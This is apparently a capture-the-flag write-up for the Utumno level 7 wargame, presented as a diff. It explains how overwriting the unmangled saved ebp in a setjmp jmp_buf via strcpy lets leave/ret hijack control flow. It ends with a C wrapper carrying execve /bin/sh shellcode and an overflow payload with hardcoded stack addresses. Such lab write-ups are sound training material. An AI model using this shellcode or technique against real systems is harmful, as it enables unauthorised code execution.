@@ -1,0 +1,117 @@
+Tough level, had me stuck for quite a long time!
+
+Running the level (with an argument), it prints out 'lol ulrich & fuck hector'... this turns out to be a relevant clue to the solution (or so I thought)
+
+Breaking it open using a debugger, the main method uses puts to dump out the previous message,
+and then calls the primary target/function for this level: 'vuln'.
+
+			vuln
+	┌───────────────────────────────────────┐
+	│ ┌ 86: vuln (int32_t argv1, );         │
+	│ │           push ebp                  │
+	│ │           mov ebp, esp              │
+	│ │           sub esp, 0x120            │
+	│ │           mov dword [var_4h], 0     │
+	│ │           lea eax, [var_a0h]        │
+	│ │           mov dword [obj.jbp], eax  │
+	│ │           lea eax, [var_a0h]        │
+	│ │           push eax                  │
+	│ │           call sym.imp._setjmp      │
+	│ │           add esp, 4                │ ; jumps back to here after longjmp
+	│ │           mov dword [var_4h], eax   │
+	│ │           cmp dword [var_4h], 0     │
+	│ │       ┌─< jne 0x80484fa             │
+	│ │       │   push dword [argv1]        │
+	│ │       │   lea eax, [var_120h]       │
+	│ │       │   push eax                  │
+	│ │       │   call sym.imp.strcpy       │
+	│ │       │   add esp, 8                │
+	│ │       │   push 0x17                 │
+	│ │       │   call dbg.jmp              │
+	│ │       │   add esp, 4                │
+	│ │       └─> mov eax, 0                │
+	│ │           leave                     │
+	│ └           ret                       │
+	└───────────────────────────────────────┘
+
+The general premise is that it calls setjmp, does a strcpy into a buffer,
+then calls 'jmp' (a wrapper for longjmp) to go back to the point right after setjmp is called.
+
+setjmp makes an interesting target for a buffer overflow for multiple reasons, and is definitely the goal for 
+the strcpy buffer overflow presented here.
+
+The way setjmp/longjmp works, is setjmp stores a snapshot of the relevant registers into a variable (of type jmp_buf)
+into the stack. Really, this is just an array of unsigned integers that contain registers.
+
+Growing down, the order of registers in the stack stored are:
+
+ebx esi edi
+ebp esp eip
+
+So the stack where jmp_buf is stored in this case, would look like this:
+(jmp_buf @ 0xffffdc8c)
+
+──────────────────────────┌ebx┐──────┌esi┐──────┌edi┐────────────────────
+0xffffdc88  0x000007d4 0x00000000 0x00000002 0x080483b0  ................ 
+0xffffdc98  0xffffdd2c 0x25f90c8a 0xd348b965 0x00000000  ,......%e.H.....
+───────────────└ebp┘──────└esp┘──────└eip┘───────────────────────────────
+                            └mangled   └mangled
+
+The last location stored in jmp_buf is able to be overridden by strcpy AND it contains the buffer that will be popped eip... which would be an appealing target.
+
+Sadly, as you can see for esp and eip, those two pointers are protected using PTR_MANGLE. This means that while you could override eip with say, 0x41414141, when
+longjmp is called and it goes to pop jmp_buf[5] into eip, it will use PTR_DEMANGLE(jmp_buf[5]), demangling 0x41414141 with an unknown random secret... control
+flow can't be altered that way. 
+
+This is where I personally got confused, and went down a long research rabbit hole about how to bypass PTR_MANGLE (unnecessarily...)
+
+Fortunately for us, there is another way around - one of the other unmangled pointers can help!
+
+Provided you do not clobber jmp_buf and follow execution, the following longjmp after strcpy restores all of the registers.
+
+Next, the program returns from vuln back to main.
+
+For most basic buffer overflows, you would attempt to alter the return address in the stack directly, but since it is BEHIND
+jmp_buf in this level, you cannot...
+
+However, this level allows you to do something you can't with most basic buffer overflows, you can alter ebp!
+
+When it attempts to return from vuln, the LEAVE and RET instructions are used...
+
+LEAVE is essentially shorthand for:
+
+│ mov esp, ebp 
+│ pop ebp     
+
+RET is essentially:
+│ pop eip
+
+This nicely sets up how we can alter the control flow of the program - we use a buffer overflow to alter the value of EBP in jmp_buf when strcpy
+is called. Altering all of the values up to ebp will NOT impact the mangled esp or eip, ensuring longjmp will jump back to the correct address.
+
+Then, when longjmp is called, ebp will be altered to our respective value.
+Next, leave is called, placing ebp into esp.
+
+At this point, the top of the stack is an address WE set.
+Ret then pops the address located at esp (which we control), and returns to it!
+
+That's the premise for the exploit, the rest of it is just figuring out addresses and such!
+
+As per usual, I wrote a wrapper prog in c and uploaded it to the server to use!
+
+			u7wrapper.c
+┌─────────────────────────────────────────────────────────────┐
+│#include <unistd.h>                                          │
+│                                                             │
+│int main(void) {                                             │
+│	char *environment[2] = {"SHELLCODE=\x50\xd4\xff\xff   │
+│\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe5\x31\xc0\x50\x68\x2f │
+│\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8d\x0c\x24\x31\xc0\x50\x51 │
+│\x8b\x1c\x24\x89\xe1\xb0\x0b\xcd\x80", 0};                   │
+│	char *argv[3] = {"/utumno/utumno7", "AAAAAAAAAAAAAAAA │
+│AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA │
+│AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xba\xdf\xff\xff""AAAAAAAAAAAAAA │ //address in this line is loc of shellcode in stack
+│AABBBBBBBBCCCC\x01\x83\x04\x08\xd0\xdc\xff\xff", 0};         │ //last 4 bytes in this line is location we want esp to point to
+│	execve("/utumno/utumno7", argv, environment);         │
+│}                                                            │
+└─────────────────────────────────────────────────────────────┘
